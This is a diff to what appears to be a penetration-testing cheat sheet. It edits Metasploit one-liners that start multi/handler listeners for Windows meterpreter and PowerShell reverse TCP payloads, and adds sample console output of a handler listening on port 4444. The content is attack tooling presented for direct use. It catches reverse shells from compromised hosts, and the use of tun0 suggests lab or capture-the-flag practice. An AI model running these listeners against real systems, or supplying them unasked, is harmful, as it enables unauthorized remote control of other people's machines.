@@ -28,16 +28,24 @@ echo $myip
 # [One Liner Start Meterpreter](#one-liner-start-meterpreter-1)
 https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
 ```sh
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT $port;run;"
+# default LPORT = 4444 
+msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;run;"
 
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT $port;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT $port;run;"
 
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT $port;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT $port;run;"
+
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/powershell_reverse_tcp;set LHOST tun0; set LPORT $port;run;"
 ```
 
 ## 
 ```sh
-
+$ msfconsole -qx "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;run;"
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => tun0
+[*] Started reverse TCP handler on 10.1.1.1:4444
 ```
 
 ### Syntax
